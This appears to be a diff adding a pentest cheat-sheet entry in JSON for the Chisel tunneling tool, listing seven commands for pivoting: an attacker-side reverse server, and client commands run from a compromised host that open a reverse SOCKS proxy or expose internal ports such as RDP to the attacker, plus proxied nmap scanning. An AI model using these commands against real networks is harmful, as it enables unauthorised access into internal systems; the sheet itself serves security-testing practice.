@@ -1,0 +1,75 @@
+{
+  "tool": "chisel",
+  "name": "Chisel",
+  "description": "A fast TCP/UDP tunnel over HTTP secured with SSH, in a single Go binary — used to build SOCKS proxies and port forwards through firewalls during pivoting.",
+  "tags": [
+    "pivoting",
+    "tunneling",
+    "SOCKS",
+    "port forwarding"
+  ],
+  "homepage": "https://github.com/jpillora/chisel",
+  "docs": "https://github.com/jpillora/chisel",
+  "install": {
+    "brew": "brew install chisel",
+    "go": "go install github.com/jpillora/chisel@latest"
+  },
+  "related": [
+    "ligolo-ng",
+    "proxychains",
+    "ssh",
+    "socat"
+  ],
+  "total_commands": 7,
+  "commands": [
+    {
+      "id": 1,
+      "category": "Server (attacker)",
+      "command": "chisel server -p <port> --reverse",
+      "example": "chisel server -p 8080 --reverse",
+      "explanation": "Starts the chisel server and allows reverse tunnels initiated by clients."
+    },
+    {
+      "id": 2,
+      "category": "Server (attacker)",
+      "command": "chisel server -p <port> --reverse --socks5",
+      "example": "chisel server -p 8080 --reverse --socks5",
+      "explanation": "Also enables SOCKS so clients can open a proxy back through you."
+    },
+    {
+      "id": 3,
+      "category": "Reverse SOCKS proxy",
+      "command": "chisel client <server>:<port> R:socks",
+      "example": "chisel client 10.10.14.5:8080 R:socks",
+      "explanation": "From a compromised host: opens a reverse SOCKS5 proxy on the server’s port 1080, giving you a route into the internal network."
+    },
+    {
+      "id": 4,
+      "category": "Reverse SOCKS proxy",
+      "command": "proxychains nmap -sT -Pn <internal-ip>",
+      "example": "proxychains nmap -sT -Pn 172.16.0.10",
+      "explanation": "Runs tools through the SOCKS proxy (set socks5 127.0.0.1 1080 in proxychains.conf)."
+    },
+    {
+      "id": 5,
+      "category": "Port forwards",
+      "command": "chisel client <server>:<port> R:<rport>:<target>:<tport>",
+      "example": "chisel client 10.10.14.5:8080 R:3389:172.16.0.10:3389",
+      "explanation": "Reverse forward: exposes an internal host’s port on the attacker machine."
+    },
+    {
+      "id": 6,
+      "category": "Port forwards",
+      "command": "chisel client <server>:<port> <lport>:<target>:<tport>",
+      "example": "chisel client 10.10.14.5:8080 8000:172.16.0.10:80",
+      "explanation": "Local forward: binds a port on the client to an internal service."
+    },
+    {
+      "id": 7,
+      "category": "Port forwards",
+      "command": "chisel client --fingerprint <fp> <server>:<port> R:socks",
+      "example": "chisel client --fingerprint AB:CD:... 10.10.14.5:8080 R:socks",
+      "explanation": "Pins the server key to prevent a man-in-the-middle on the tunnel."
+    }
+  ]
+}
